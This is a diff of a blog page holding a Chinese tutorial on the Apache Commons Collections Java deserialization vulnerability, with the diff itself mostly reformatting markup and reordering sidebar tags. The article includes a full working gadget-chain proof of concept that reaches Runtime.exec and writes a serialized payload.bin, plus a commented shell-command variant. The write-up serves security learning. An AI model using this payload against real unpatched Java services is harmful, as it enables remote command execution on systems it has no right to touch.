@@ -193,6 +193,7 @@
     
     <!-- 谷歌统计  -->
     
+	<link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
 </head>
 
     
@@ -386,13 +387,14 @@
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p><strong>Web</strong><br><a id="more"></a></p>
+        <p><strong>Web</strong></p>
+<a id="more"></a>
 <p>开始补Java安全的相关知识。</p>
 <p>Apache Commons Collections 是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p>
 <p>2016年前后，Apache Commons Collections 反序列化漏洞横扫了WebLogic、WebSphere、JBoss、Jenkins、OpenNMS多个Java应用。</p>
 <p>网上有很多关于该漏洞的分析文章，还是要自己走一遍加深印象。</p>
 <p>漏洞影响版本： <em>commons-collections &lt;= 3.2.1</em>  ,  <em>jdk &lt;= 1.7</em></p>
-<p>在开始分析漏洞之前，需要对Java里的反射机制有一定了解，详情可见 <a href="https://www.bilibili.com/video/av56351262?p=6" target="_blank" rel="noopener">https://www.bilibili.com/video/av56351262?p=6</a> </p>
+<p>在开始分析漏洞之前，需要对Java里的反射机制有一定了解，详情可见 <a href="https://www.bilibili.com/video/av56351262?p=6" target="_blank" rel="noopener">https://www.bilibili.com/video/av56351262?p=6</a></p>
 <p>这里贴个图看一下常用的一些获取功能</p>
 <p><img src="1.png" alt="automne"></p>
 <p>Java的序列化/反序列化对应的API接口：</p>
@@ -426,18 +428,18 @@
 <p>这里的setValue可以用于触发上面的攻击链。</p>
 <p>同理看一下修复后的jdk 1.8里的对应代码，已经没有再使用setValue：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    GetField fields = s.readFields();</span><br><span class="line">    Class&lt;? extends Annotation&gt; t = (Class)fields.get(<span class="string">"type"</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    Map&lt;String, Object&gt; streamVals = (Map)fields.get(<span class="string">"memberValues"</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(t);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">    Map&lt;String, Object&gt; mv = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line"></span><br><span class="line">    String name;</span><br><span class="line">    Object value;</span><br><span class="line">    <span class="keyword">for</span>(Iterator var8 = streamVals.entrySet().iterator(); var8.hasNext(); mv.put(name, value)) &#123;</span><br><span class="line">        Entry&lt;String, Object&gt; memberValue = (Entry)var8.next();</span><br><span class="line">        name = (String)memberValue.getKey();</span><br><span class="line">        value = <span class="keyword">null</span>;</span><br><span class="line">        Class&lt;?&gt; memberType = (Class)memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;</span><br><span class="line">            value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!memberType.isInstance(value) &amp;&amp; !(value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                value = (<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(value.getClass() + <span class="string">"["</span> + value + <span class="string">"]"</span>)).setMember((Method)annotationType.members().get(name));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setType(<span class="keyword">this</span>, t);</span><br><span class="line">    AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(<span class="keyword">this</span>, mv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>从这里 <a href="https://xz.aliyun.com/t/136" target="_blank" rel="noopener">https://xz.aliyun.com/t/136</a> 抄的POC，注释很详细，但是发现运行的时候有些问题，结合 <a href="http://mi0.xyz/2019/09/07/浅显易懂的java反序列化入门/" target="_blank" rel="noopener">http://mi0.xyz/2019/09/07/%e6%b5%85%e6%98%be%e6%98%93%e6%87%82%e7%9a%84java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%85%a5%e9%97%a8/</a> 进行了修改：</p>
+<p>从这里 <a href="https://xz.aliyun.com/t/136" target="_blank" rel="noopener">https://xz.aliyun.com/t/136</a> 抄的POC，注释很详细，但是发现运行的时候有些问题，结合 <a href="http://mi0.xyz/2019/09/07/%E6%B5%85%E6%98%BE%E6%98%93%E6%87%82%E7%9A%84java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/" target="_blank" rel="noopener">http://mi0.xyz/2019/09/07/%e6%b5%85%e6%98%be%e6%98%93%e6%87%82%e7%9a%84java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%85%a5%e9%97%a8/</a> 进行了修改：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. Transformer[] transformers = new Transformer[]&#123;&#125;不能再使用上面示例POC代码的构造形式，否则反序列化时会报java.lang.IllegalArgumentException错误</span><br><span class="line">2. 另外注意BeforeTransformerMap.put(&quot;value&quot;, &quot;spring coming soon&quot;);的时候第一个参数要为&quot;value&quot;，否则也是无法执行成功</span><br></pre></td></tr></table></figure>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CollectionPoc2</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//execArgs: 待执行的命令数组</span></span><br><span class="line">        <span class="comment">//String[] execArgs = new String[] &#123; "sh", "-c", "whoami &gt; /tmp/fuck" &#125;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//transformers: 一个transformer链，包含各类transformer对象（预设转化逻辑）的转化数组</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//transformedChain: ChainedTransformer类对象，传入transformers数组，可以按照transformers数组的逻辑执行转化操作</span></span><br><span class="line">        Transformer transformedChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//BeforeTransformerMap: Map数据结构，转换前的Map，Map数据结构内的对象是键值对形式，类比于python的dict</span></span><br><span class="line">        <span class="comment">//Map&lt;String, String&gt; BeforeTransformerMap = new HashMap&lt;String, String&gt;();</span></span><br><span class="line">        Map&lt;String,String&gt; BeforeTransformerMap = <span class="keyword">new</span> HashMap&lt;String,String&gt;();</span><br><span class="line"></span><br><span class="line">        BeforeTransformerMap.put(<span class="string">"value"</span>, <span class="string">"spring coming soon"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Map数据结构，转换后的Map</span></span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">       TransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数。</span></span><br><span class="line"><span class="comment">            第一个参数为待转化的Map对象</span></span><br><span class="line"><span class="comment">            第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空）</span></span><br><span class="line"><span class="comment">            第三个参数为Map对象内的value要经过的转化方法。</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">        <span class="comment">//TransformedMap.decorate(目标Map, key的转化对象（单个或者链或者null）, value的转化对象（单个或者链或者null）);</span></span><br><span class="line">        Map AfterTransformerMap = TransformedMap.decorate(BeforeTransformerMap, <span class="keyword">null</span>, transformedChain);</span><br><span class="line"></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line"></span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(Target.class, AfterTransformerMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化操作</span></span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(instance);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化操作</span></span><br><span class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line">        Object result = objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">思路:构建BeforeTransformerMap的键值对，为其赋值，</span></span><br><span class="line"><span class="comment">     利用TransformedMap的decorate方法，对Map数据结构的key/value进行transforme</span></span><br><span class="line"><span class="comment">     对BeforeTransformerMap的value进行转换，当BeforeTransformerMap的value执行完一个完整转换链，就完成了命令执行</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     执行本质: ((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec(.........)</span></span><br><span class="line"><span class="comment">     利用反射调用Runtime() 执行了一段系统命令, Runtime.getRuntime().exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
 <p>上面的代码执行完之后会生成二进制文件(序列化后的)payload.bin，紧接着再直接通过反序列化(readObject)执行了命令。</p>
 <p><img src="4.png" alt="automne"></p>
 <p>在真实漏洞环境中则是把payload.bin传递给具有相应环境的反序列化数据交互接口使之触发命令执行的 gadget。</p>
 <p>参考链接：</p>
-<p> <a href="https://xz.aliyun.com/t/136" target="_blank" rel="noopener">https://xz.aliyun.com/t/136</a> </p>
-<p> <a href="https://blog.knownsec.com/2015/12/untrusted-deserialization-exploit-with-java/" target="_blank" rel="noopener">https://blog.knownsec.com/2015/12/untrusted-deserialization-exploit-with-java/</a> </p>
-<p> <a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/" target="_blank" rel="noopener">https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/</a> </p>
-<p> <a href="https://www.cnblogs.com/wfzWebSecuity/p/11505122.html" target="_blank" rel="noopener">https://www.cnblogs.com/wfzWebSecuity/p/11505122.html</a> </p>
-<p> <a href="http://mi0.xyz/2019/09/07/浅显易懂的java反序列化入门/" target="_blank" rel="noopener">http://mi0.xyz/2019/09/07/%e6%b5%85%e6%98%be%e6%98%93%e6%87%82%e7%9a%84java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%85%a5%e9%97%a8/</a> </p>
+<p><a href="https://xz.aliyun.com/t/136" target="_blank" rel="noopener">https://xz.aliyun.com/t/136</a></p>
+<p><a href="https://blog.knownsec.com/2015/12/untrusted-deserialization-exploit-with-java/" target="_blank" rel="noopener">https://blog.knownsec.com/2015/12/untrusted-deserialization-exploit-with-java/</a></p>
+<p><a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/" target="_blank" rel="noopener">https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/</a></p>
+<p><a href="https://www.cnblogs.com/wfzWebSecuity/p/11505122.html" target="_blank" rel="noopener">https://www.cnblogs.com/wfzWebSecuity/p/11505122.html</a></p>
+<p><a href="http://mi0.xyz/2019/09/07/%E6%B5%85%E6%98%BE%E6%98%93%E6%87%82%E7%9A%84java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/" target="_blank" rel="noopener">http://mi0.xyz/2019/09/07/%e6%b5%85%e6%98%be%e6%98%93%e6%87%82%e7%9a%84java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%85%a5%e9%97%a8/</a></p>
 
     </article>
     <!-- license  -->
@@ -585,6 +587,62 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -1588,15 +1646,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="broadcastreceiver"><span class="iconfont-archer">&#xe606;</span>broadcastreceiver</span>
     
-        <span class="sidebar-tag-name" data-tags="sha-1"><span class="iconfont-archer">&#xe606;</span>sha-1</span>
-    
         <span class="sidebar-tag-name" data-tags="fat"><span class="iconfont-archer">&#xe606;</span>fat</span>
     
         <span class="sidebar-tag-name" data-tags="git"><span class="iconfont-archer">&#xe606;</span>git</span>
-    
-        <span class="sidebar-tag-name" data-tags="sqli"><span class="iconfont-archer">&#xe606;</span>sqli</span>
-    
-        <span class="sidebar-tag-name" data-tags="sqlite"><span class="iconfont-archer">&#xe606;</span>sqlite</span>
     
         <span class="sidebar-tag-name" data-tags="cbc"><span class="iconfont-archer">&#xe606;</span>cbc</span>
     
@@ -1606,15 +1658,27 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="photorec"><span class="iconfont-archer">&#xe606;</span>photorec</span>
     
-        <span class="sidebar-tag-name" data-tags="MAC"><span class="iconfont-archer">&#xe606;</span>MAC</span>
+        <span class="sidebar-tag-name" data-tags="sqli"><span class="iconfont-archer">&#xe606;</span>sqli</span>
+    
+        <span class="sidebar-tag-name" data-tags="sqlite"><span class="iconfont-archer">&#xe606;</span>sqlite</span>
     
         <span class="sidebar-tag-name" data-tags="padding oracle"><span class="iconfont-archer">&#xe606;</span>padding oracle</span>
+    
+        <span class="sidebar-tag-name" data-tags="MAC"><span class="iconfont-archer">&#xe606;</span>MAC</span>
+    
+        <span class="sidebar-tag-name" data-tags="sso"><span class="iconfont-archer">&#xe606;</span>sso</span>
+    
+        <span class="sidebar-tag-name" data-tags="oauth 2.0"><span class="iconfont-archer">&#xe606;</span>oauth 2.0</span>
     
         <span class="sidebar-tag-name" data-tags="golang"><span class="iconfont-archer">&#xe606;</span>golang</span>
     
         <span class="sidebar-tag-name" data-tags="race condition"><span class="iconfont-archer">&#xe606;</span>race condition</span>
     
-        <span class="sidebar-tag-name" data-tags="pwntools"><span class="iconfont-archer">&#xe606;</span>pwntools</span>
+        <span class="sidebar-tag-name" data-tags="ecb"><span class="iconfont-archer">&#xe606;</span>ecb</span>
+    
+        <span class="sidebar-tag-name" data-tags="socat"><span class="iconfont-archer">&#xe606;</span>socat</span>
+    
+        <span class="sidebar-tag-name" data-tags="sha-1"><span class="iconfont-archer">&#xe606;</span>sha-1</span>
     
         <span class="sidebar-tag-name" data-tags="frida"><span class="iconfont-archer">&#xe606;</span>frida</span>
     
@@ -1630,15 +1694,15 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="boneh durfee"><span class="iconfont-archer">&#xe606;</span>boneh durfee</span>
     
+        <span class="sidebar-tag-name" data-tags="pwntools"><span class="iconfont-archer">&#xe606;</span>pwntools</span>
+    
         <span class="sidebar-tag-name" data-tags="spi"><span class="iconfont-archer">&#xe606;</span>spi</span>
     
         <span class="sidebar-tag-name" data-tags="snakeyaml"><span class="iconfont-archer">&#xe606;</span>snakeyaml</span>
     
         <span class="sidebar-tag-name" data-tags="ScriptEngineManager"><span class="iconfont-archer">&#xe606;</span>ScriptEngineManager</span>
     
-        <span class="sidebar-tag-name" data-tags="sso"><span class="iconfont-archer">&#xe606;</span>sso</span>
-    
-        <span class="sidebar-tag-name" data-tags="oauth 2.0"><span class="iconfont-archer">&#xe606;</span>oauth 2.0</span>
+        <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
         <span class="sidebar-tag-name" data-tags="lcg"><span class="iconfont-archer">&#xe606;</span>lcg</span>
     
@@ -1648,23 +1712,13 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="cipolla's algorithm"><span class="iconfont-archer">&#xe606;</span>cipolla's algorithm</span>
     
-        <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
-    
-        <span class="sidebar-tag-name" data-tags="yara plugin"><span class="iconfont-archer">&#xe606;</span>yara plugin</span>
-    
         <span class="sidebar-tag-name" data-tags="malware"><span class="iconfont-archer">&#xe606;</span>malware</span>
     
         <span class="sidebar-tag-name" data-tags="codereflect"><span class="iconfont-archer">&#xe606;</span>codereflect</span>
     
-        <span class="sidebar-tag-name" data-tags="deserialization"><span class="iconfont-archer">&#xe606;</span>deserialization</span>
-    
-        <span class="sidebar-tag-name" data-tags="log4j"><span class="iconfont-archer">&#xe606;</span>log4j</span>
-    
         <span class="sidebar-tag-name" data-tags="gmpy2"><span class="iconfont-archer">&#xe606;</span>gmpy2</span>
     
-        <span class="sidebar-tag-name" data-tags="ecb"><span class="iconfont-archer">&#xe606;</span>ecb</span>
-    
-        <span class="sidebar-tag-name" data-tags="socat"><span class="iconfont-archer">&#xe606;</span>socat</span>
+        <span class="sidebar-tag-name" data-tags="yara plugin"><span class="iconfont-archer">&#xe606;</span>yara plugin</span>
     
         <span class="sidebar-tag-name" data-tags="rsa"><span class="iconfont-archer">&#xe606;</span>rsa</span>
     
@@ -1673,6 +1727,10 @@ top:50vh;
         <span class="sidebar-tag-name" data-tags="javascript prototype pollution"><span class="iconfont-archer">&#xe606;</span>javascript prototype pollution</span>
     
         <span class="sidebar-tag-name" data-tags="nodejs"><span class="iconfont-archer">&#xe606;</span>nodejs</span>
+    
+        <span class="sidebar-tag-name" data-tags="deserialization"><span class="iconfont-archer">&#xe606;</span>deserialization</span>
+    
+        <span class="sidebar-tag-name" data-tags="log4j"><span class="iconfont-archer">&#xe606;</span>log4j</span>
     
         <span class="sidebar-tag-name" data-tags="primefac"><span class="iconfont-archer">&#xe606;</span>primefac</span>
     
@@ -1684,11 +1742,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="tshark"><span class="iconfont-archer">&#xe606;</span>tshark</span>
     
-        <span class="sidebar-tag-name" data-tags=".iso"><span class="iconfont-archer">&#xe606;</span>.iso</span>
+        <span class="sidebar-tag-name" data-tags="RsaCtfTool"><span class="iconfont-archer">&#xe606;</span>RsaCtfTool</span>
     
-        <span class="sidebar-tag-name" data-tags="gpg"><span class="iconfont-archer">&#xe606;</span>gpg</span>
-    
-        <span class="sidebar-tag-name" data-tags="outguess"><span class="iconfont-archer">&#xe606;</span>outguess</span>
+        <span class="sidebar-tag-name" data-tags="Hex"><span class="iconfont-archer">&#xe606;</span>Hex</span>
     
         <span class="sidebar-tag-name" data-tags="flask"><span class="iconfont-archer">&#xe606;</span>flask</span>
     
@@ -1696,9 +1752,11 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="ecc"><span class="iconfont-archer">&#xe606;</span>ecc</span>
     
-        <span class="sidebar-tag-name" data-tags="RsaCtfTool"><span class="iconfont-archer">&#xe606;</span>RsaCtfTool</span>
+        <span class="sidebar-tag-name" data-tags=".iso"><span class="iconfont-archer">&#xe606;</span>.iso</span>
     
-        <span class="sidebar-tag-name" data-tags="Hex"><span class="iconfont-archer">&#xe606;</span>Hex</span>
+        <span class="sidebar-tag-name" data-tags="gpg"><span class="iconfont-archer">&#xe606;</span>gpg</span>
+    
+        <span class="sidebar-tag-name" data-tags="outguess"><span class="iconfont-archer">&#xe606;</span>outguess</span>
     
         <span class="sidebar-tag-name" data-tags="nim game"><span class="iconfont-archer">&#xe606;</span>nim game</span>
     
@@ -1718,17 +1776,17 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="rsa lsb oracle"><span class="iconfont-archer">&#xe606;</span>rsa lsb oracle</span>
     
+        <span class="sidebar-tag-name" data-tags="weblogic"><span class="iconfont-archer">&#xe606;</span>weblogic</span>
+    
+        <span class="sidebar-tag-name" data-tags="xxe"><span class="iconfont-archer">&#xe606;</span>xxe</span>
+    
+        <span class="sidebar-tag-name" data-tags="xor"><span class="iconfont-archer">&#xe606;</span>xor</span>
+    
         <span class="sidebar-tag-name" data-tags="rmi"><span class="iconfont-archer">&#xe606;</span>rmi</span>
     
         <span class="sidebar-tag-name" data-tags="fastjson"><span class="iconfont-archer">&#xe606;</span>fastjson</span>
     
         <span class="sidebar-tag-name" data-tags="jndi"><span class="iconfont-archer">&#xe606;</span>jndi</span>
-    
-        <span class="sidebar-tag-name" data-tags="xor"><span class="iconfont-archer">&#xe606;</span>xor</span>
-    
-        <span class="sidebar-tag-name" data-tags="weblogic"><span class="iconfont-archer">&#xe606;</span>weblogic</span>
-    
-        <span class="sidebar-tag-name" data-tags="xxe"><span class="iconfont-archer">&#xe606;</span>xxe</span>
     
         <span class="sidebar-tag-name" data-tags="reflect"><span class="iconfont-archer">&#xe606;</span>reflect</span>
     
@@ -1773,9 +1831,9 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="Android"><span class="iconfont-archer">&#xe60a;</span>Android</span>
     
-        <span class="sidebar-category-name" data-categories="Web"><span class="iconfont-archer">&#xe60a;</span>Web</span>
-    
         <span class="sidebar-category-name" data-categories="Forensics"><span class="iconfont-archer">&#xe60a;</span>Forensics</span>
+    
+        <span class="sidebar-category-name" data-categories="Web"><span class="iconfont-archer">&#xe60a;</span>Web</span>
     
         <span class="sidebar-category-name" data-categories="Misc"><span class="iconfont-archer">&#xe60a;</span>Misc</span>
     
